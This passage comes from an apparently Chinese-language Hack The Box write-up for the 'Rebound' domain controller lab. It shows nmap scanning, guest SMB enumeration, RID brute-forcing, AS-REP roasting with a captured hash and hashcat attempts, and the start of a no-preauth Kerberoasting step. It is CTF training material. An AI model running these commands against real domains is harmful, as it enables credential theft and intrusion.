open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49694/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">49720/tcp open  unknown</span><br><span class="line">49737/tcp open  unknown</span><br><span class="line">49803/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 189.13 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤出开放端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> |<span class="built_in">paste</span> -sd <span class="string">&#x27;,&#x27;</span>)</span><br></pre></td></tr></table></figure><p>进行更详细的扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p<span class="variable">$ports</span> 10.10.11.231 -oA nmapscan/detail</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 20:33 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.231</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-17 19:16:08Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2025-02-16T18:33:25</span><br><span class="line">|_Not valid after:  2026-02-16T18:33:25</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-02-17T19:19:02+00:00; +6h42m55s from scanner time.</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2025-02-16T18:33:25</span><br><span class="line">|_Not valid after:  2026-02-16T18:33:25</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-02-17T19:19:02+00:00; +6h42m56s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: DNS:dc01.rebound.htb</span><br><span class="line">| Not valid before: 2025-02-16T18:33:25</span><br><span class="line">|_Not valid after:  2026-02-16T18:33:25</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-02-17T19:19:02+00:00; +6h42m55s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49694/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49720/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49737/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49803/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (90%), Microsoft Windows Server 2016 (90%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows 10 1703 (90%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-02-17T19:18:47</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 6h42m55s, deviation: 0s, median: 6h42m54s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 184.03 seconds</span><br></pre></td></tr></table></figure><blockquote><p>注：这里存在clock-skew: mean: 6h42m55s, deviation: 0s, median: 6h42m54s，我们在域渗透中需要对时间进行同步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo ntpdate 10.10.11.231  //走udp协议</span><br></pre></td></tr></table></figure><p>或使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo net time <span class="built_in">set</span> -S 10.10.11.231  //走smb 445 139 135</span><br></pre></td></tr></table></figure></blockquote><p>可以同时进行udp端口扫描和漏洞脚本扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 40 10.10.11.231 -oA nmapscan/udp</span><br><span class="line">sudo nmap -script=vuln -p<span class="variable">$ports</span> 10.10.11.231 -oA nmapscan/vuln</span><br></pre></td></tr></table></figure><p>udp端口扫描结果如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 20:44 CST</span><br><span class="line">Nmap scan report for 10.10.11.231</span><br><span class="line">Host is up (0.15s latency).</span><br><span class="line">Not shown: 29 closed udp ports (port-unreach)</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">53/udp   open          domain</span><br><span class="line">123/udp  open          ntp</span><br><span class="line">137/udp  open|filtered netbios-ns</span><br><span class="line">138/udp  open|filtered netbios-dgm</span><br><span class="line">139/udp  open|filtered netbios-ssn</span><br><span class="line">500/udp  open|filtered isakmp</span><br><span class="line">514/udp  open|filtered syslog</span><br><span class="line">520/udp  open|filtered route</span><br><span class="line">1900/udp open|filtered upnp</span><br><span class="line">4500/udp open|filtered nat-t-ike</span><br><span class="line">5353/udp open|filtered zeroconf</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 36.44 seconds</span><br></pre></td></tr></table></figure><p>漏洞脚本扫描结果如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.231</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49694/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">49720/tcp open  unknown</span><br><span class="line">49737/tcp open  unknown</span><br><span class="line">49803/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|<span class="emphasis">_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="emphasis">|_</span>smb-vuln-ms10-054: false</span><br><span class="line">|<span class="emphasis">_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">Nmap done: 1 IP address (1 host up) scanned in 200.79 seconds</span></span><br></pre></td></tr></table></figure><p>刚才在我们的nmap扫描结果中发现了两个域名<code>rebound.htb</code>和<code>dc01.rebound.htb</code>，我们将其加入到hosts文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&#x27;1i 10.10.11.231 rebound.htb dc01.rebound.htb&#x27;</span> /etc/hosts</span><br></pre></td></tr></table></figure><p>从上面的扫描中我们很容易的可以判断出这是一台域控机器</p><h2 id="smb共享枚举"><a href="#smb共享枚举" class="headerlink" title="smb共享枚举"></a>smb共享枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb --shares</span><br></pre></td></tr></table></figure><p>从输出结果中没有发现有用信息</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217213158.png" alt="微信截图_20250217213158"></p><p>如果自己搭建过smb共享的话我们知道任何不属于smb账户的账户均能被映射成guest账户（前提是开放了匿名共享），我们尝试进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb -u chromos2me -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure><p>可以看到我们对<code>IPC$</code>和<code>Shared</code>两个文件夹存在读取权限</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217213717.png" alt="微信截图_20250217213717"></p><p>我们利用impacket工具包进行读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbclient rebound.htb/chromos2me@10.10.11.231 -no-pass</span><br></pre></td></tr></table></figure><p>是一个很典型的smb共享</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217214913.png" alt="微信截图_20250217214913"></p><p>我们枚举一下<code>Shared</code>共享，发现没有可用的信息</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250217215021.png" alt="微信截图_20250217215021"></p><p>看一下<code>IPC$</code>共享，发现存在一些东西，但是似乎用不上</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218155315.png" alt="微信截图_20250218155315"></p><h2 id="RID枚举"><a href="#RID枚举" class="headerlink" title="RID枚举"></a>RID枚举</h2><p>我们只要对域有一定的了解我们就会知道SID的最后一位是<strong>RID（Relative Identifier，相对标识符）</strong>，用于唯一标识域或本地系统中的用户和组，通过枚举RID我们可以对系统中的用户及其所属组有一定的掌握</p><p>常见的进行枚举的方法有很多，如Impacket的 <code>lookupsid.py</code>，或是利用<code>rpcclient</code>下的<code>enumdomusers</code>命令（权限要求相对较高，枚举失败可能性很大）等等</p><p>利用rpc匿名登录进行枚举显示权限不足</p><p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218160315.png" alt="微信截图_20250218160315"></p><p>更换枚举方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-lookupsid chromos2me@rebound.htb -no-pass  </span><br></pre></td></tr></table></figure><p>同时可以结合选项<code>maxRid</code>枚举更大的SID</p><blockquote><p><code>maxRid                max Rid to check (default 4000)</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-lookupsid chromos2me@rebound.htb 40000 -no-pass  </span><br></pre></td></tr></table></figure><p>枚举结果如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Brute forcing SIDs at rebound.htb</span><br><span class="line">[*] StringBinding ncacn_np:rebound.htb[\pipe\lsarpc]</span><br><span class="line">[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209</span><br><span class="line">498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">500: rebound\Administrator (SidTypeUser)</span><br><span class="line">501: rebound\Guest (SidTypeUser)</span><br><span class="line">502: rebound\krbtgt (SidTypeUser)</span><br><span class="line">512: rebound\Domain Admins (SidTypeGroup)</span><br><span class="line">513: rebound\Domain Users (SidTypeGroup)</span><br><span class="line">514: rebound\Domain Guests (SidTypeGroup)</span><br><span class="line">515: rebound\Domain Computers (SidTypeGroup)</span><br><span class="line">516: rebound\Domain Controllers (SidTypeGroup)</span><br><span class="line">517: rebound\Cert Publishers (SidTypeAlias)</span><br><span class="line">518: rebound\Schema Admins (SidTypeGroup)</span><br><span class="line">519: rebound\Enterprise Admins (SidTypeGroup)</span><br><span class="line">520: rebound\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">521: rebound\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">522: rebound\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">525: rebound\Protected Users (SidTypeGroup)</span><br><span class="line">526: rebound\Key Admins (SidTypeGroup)</span><br><span class="line">527: rebound\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">553: rebound\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">572: rebound\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">1000: rebound\DC01$ (SidTypeUser)</span><br><span class="line">1101: rebound\DnsAdmins (SidTypeAlias)</span><br><span class="line">1102: rebound\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">1951: rebound\ppaul (SidTypeUser)</span><br><span class="line">2952: rebound\llune (SidTypeUser)</span><br><span class="line">3382: rebound\fflock (SidTypeUser)</span><br><span class="line">5277: rebound\jjones (SidTypeUser)</span><br><span class="line">5569: rebound\mmalone (SidTypeUser)</span><br><span class="line">5680: rebound\nnoon (SidTypeUser)</span><br><span class="line">7681: rebound\ldap_monitor (SidTypeUser)</span><br><span class="line">7682: rebound\oorend (SidTypeUser)</span><br><span class="line">7683: rebound\ServiceMgmt (SidTypeGroup)</span><br><span class="line">7684: rebound\winrm_svc (SidTypeUser)</span><br><span class="line">7685: rebound\batch_runner (SidTypeUser)</span><br><span class="line">7686: rebound\tbrady (SidTypeUser)</span><br><span class="line">7687: rebound\delegator$ (SidTypeUser)</span><br></pre></td></tr></table></figure><p>我们提取出我们需要的用户账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> rids | grep SidTypeUser | grep -v <span class="string">&#x27;\$&#x27;</span> | awk -F <span class="string">&#x27;\&#x27;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | awk -F <span class="string">&#x27;(&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tee</span> <span class="built_in">users</span></span><br></pre></td></tr></table></figure><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>现在我们拥有了域内用户信息，可以尝试进行AS-REP Roasting攻击，即那些没有进行kerberos身份预验证的账户，他们可以直接向KDC请求TGT票据，KDC会返回TGT票据以及利用用户密码哈希加密的Session Key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-GetNPUsers -usersfile <span class="built_in">users</span> -request -format hashcat -dc-ip 10.10.11.231 rebound.htb/  </span><br></pre></td></tr></table></figure><p>我们拿到一组票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23<span class="variable">$jjones</span>@REBOUND.HTB:90eceab92a97ec106b04a553836ccf63<span class="variable">$29864af1884ffda71304e868cbccc40d0b7412e4aad18d712c47484c2ebe144153e3ded5bb88eff602236e8c741dd1135dd60069c280c3901e11f5185a675e76dafeb085e6322604b1ab76ab70bd684dbe62979ec5617ba84508749be580bfd3fb15673be2aaa24dd37d4cee7dc001f5edae563d08487de7a798d298b4bec490b14435ab563d864b1b3721eed73315afe782abc63c7c61d40f11047c4c1056f9c10abbb08363fca070907015419b2c0c0b56de28e4d8abbe11d7c57a944cecc6dc501ba1fe1e648abdbfc0080d6734f1030cfbb6fd3de584de2967feb9c358a90af71258bfff0544eeaf</span></span><br></pre></td></tr></table></figure><p>或者利用nxc进行asrep-roasting攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc ldap -u <span class="built_in">users</span> -p <span class="string">&#x27;&#x27;</span> --asreproast asrep rebound.htb</span><br></pre></td></tr></table></figure><p>返回相同的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">LDAP        10.10.11.231    445    DC01             $krb5asrep$23<span class="variable">$jjones</span>@REBOUND.HTB:4d4b23e6080644cba535559a570eec9c<span class="variable">$03a8ee4eb3373b908413c80b80f7829f9ce0229ea9891fda70d8e3759d3bbbaee6c252101aa5698cfb400b13158781d9b2e0723e001415751ccea4b247bd32dbfcf610a1245c19ed27920fdd5ad1fc00fd521633527ddf5e153039584f96449b088b860a00b7d7cf61985d6bbc9b6a3e30f130ccf0716bbb635d01fcdf44e1e91a7ed9000fd59d775e55d104eb083dd125c3190ce0757a8ac2638f072df7472455e453874c8a1209288bd8915503fd10d2dc932fe6476606dba5f347d9fd3cd902090c672a0808d5f6610d062298ac50c07581af14d06c20290d1d8181d891245beef1ab182a027146c5</span></span><br></pre></td></tr></table></figure><p>利用hashcat进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 18200 <span class="string">&#x27;$krb5asrep$23$jjones@REBOUND.HTB:4d4b23e6080644cba535559a570eec9c$03a8ee4eb3373b908413c80b80f7829f9ce0229ea9891fda70d8e3759d3bbbaee6c252101aa5698cfb400b13158781d9b2e0723e001415751ccea4b247bd32dbfcf610a1245c19ed27920fdd5ad1fc00fd521633527ddf5e153039584f96449b088b860a00b7d7cf61985d6bbc9b6a3e30f130ccf0716bbb635d01fcdf44e1e91a7ed9000fd59d775e55d104eb083dd125c3190ce0757a8ac2638f072df7472455e453874c8a1209288bd8915503fd10d2dc932fe6476606dba5f347d9fd3cd902090c672a0808d5f6610d062298ac50c07581af14d06c20290d1d8181d891245beef1ab182a027146c5&#x27;</span> /usr/share/wordlists/rockyou.txt  </span><br></pre></td></tr></table></figure><p>没有成功破解，尝试添加密码规则扩充密钥空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 18200 <span class="string">&#x27;$krb5asrep$23$jjones@REBOUND.HTB:4d4b23e6080644cba535559a570eec9c$03a8ee4eb3373b908413c80b80f7829f9ce0229ea9891fda70d8e3759d3bbbaee6c252101aa5698cfb400b13158781d9b2e0723e001415751ccea4b247bd32dbfcf610a1245c19ed27920fdd5ad1fc00fd521633527ddf5e153039584f96449b088b860a00b7d7cf61985d6bbc9b6a3e30f130ccf0716bbb635d01fcdf44e1e91a7ed9000fd59d775e55d104eb083dd125c3190ce0757a8ac2638f072df7472455e453874c8a1209288bd8915503fd10d2dc932fe6476606dba5f347d9fd3cd902090c672a0808d5f6610d062298ac50c07581af14d06c20290d1d8181d891245beef1ab182a027146c5&#x27;</span> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --potfile-disable</span><br></pre></td></tr></table></figure><p>仍不成功，放弃asrep-roasting</p><h2 id="Kerberos-Roasting"><a href="#Kerberos-Roasting" class="headerlink" title="Kerberos-Roasting"></a>Kerberos-Roasting</h2><p><a href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">研究</a>表明，可以利用AS-REP-roastable用户来执行Kerberoasting，无需预认证</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">However, for Kerberoasting, access to the session key is not required. Only the resulting ST—or more accurately, the encrypted part of the ST, which is not secured with the requesting accounts key—is required. Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without any credentials. This method of Kerberoasting has been implemented in Rubeus within this PR.</span><br></pre></td></tr></table></figure><p>利用jjones这个不需要进行身份预验证的账户进行新型Kerberos-Roasting攻击，攻击处在KRB_TGS_REP这个过程，我们可以拿到利用此服务账号的NTLM HASH加密过的TGS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-GetUserSPNs -no-preauth jjones -usersfile <span class="built_in">users</span> -dc-host dc01.rebound.htb rebound.htb/</span><br><span class="line">//官方给出的实际上效果是一样的</span><br><span class="line">GetUserSPNs.py -no-preauth jjones -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231</span><br></pre></td></tr></table></figure><blockquote><p><code>impacket-GetUserSPNs</code>：用于获取域中指定用户的 <strong>Service Principal Names (SPNs)</strong>。SPNs 是 Kerberos 认证过程中的关键元素，它们标识了与特定服务相关的账户。</p><p><code>-no-preauth</code>：表示禁用 <strong>预身份验证</strong>（Pre-Authentication）检查。在正常的 Kerberos 认证过程中，预身份验证是一个安全措施，用于确保请求的有效性。如果目标账户禁用了预身份验证（即帐户允许“无预身份验证”登录），那么使用此选项可以绕过此检查，从而直接请求 SPN。</p></blockquote><p>结果如下</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] Principal: Administrator - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: Guest - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">$krb5tgs$18$krbtgt$REBOUND.HTB$<span 